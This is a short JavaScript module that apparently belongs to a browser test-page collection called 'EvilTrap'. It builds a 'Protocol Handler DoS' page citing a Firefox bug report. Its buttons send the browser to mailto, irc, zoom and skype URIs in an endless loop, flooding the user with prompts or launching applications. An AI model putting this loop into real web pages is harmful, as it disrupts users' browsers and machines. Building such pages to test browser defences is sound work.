/* eslint-disable no-constant-condition */
const EvilTrap = require('../../EvilTrap');

module.exports = new EvilTrap('Protocol Handler DoS', EvilTrap.CATEGORY.DOS,
  'Repeated calls to external protocols URIs triggering prompts or external applications.', { firefox: '1573736' })
  .addScriptPage(() => {
    function createProtoSpamBtn(proto) {
      const btn = document.createElement('button');
      btn.innerText = proto;
      btn.addEventListener('click', async () => {
        while (true) {
          window.location.href = proto;
          // eslint-disable-next-line no-await-in-loop
          await new Promise((resolve) => setTimeout(resolve, 100));
        }
      });
      document.body.appendChild(btn);
      document.body.appendChild(document.createElement('br'));
    }

    const description = document.createElement('p');
    description.innerText = 'These protocol URIs work depending on which applications you have installed. If you have previously set an application handler as default it will spam calls to the application.';
    document.body.appendChild(description);

    createProtoSpamBtn('mailto://user@example.com');
    createProtoSpamBtn('irc://example.com');
    createProtoSpamBtn('zoommtg://zoom.us/start?confno=123456789&pwd=xxxx');
    createProtoSpamBtn('skype://test');
  });
